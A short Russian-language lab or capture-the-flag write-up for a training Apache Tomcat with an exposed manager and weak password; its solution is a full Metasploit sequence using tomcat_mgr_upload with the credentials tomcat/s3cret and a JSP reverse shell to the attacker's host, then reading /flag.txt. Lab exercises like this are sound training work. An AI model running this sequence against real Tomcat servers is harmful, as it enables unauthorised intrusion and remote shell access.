# Metasploit Tomcat 201

Учебный Apache Tomcat с открытым manager и слабым паролем.

## Решение

```
msfconsole -q
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <target>
set RPORT 5000
set USERNAME tomcat
set PASSWORD s3cret
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <your-ip>
set LPORT 4444
run
```

После получения shell: `cat /flag.txt`.
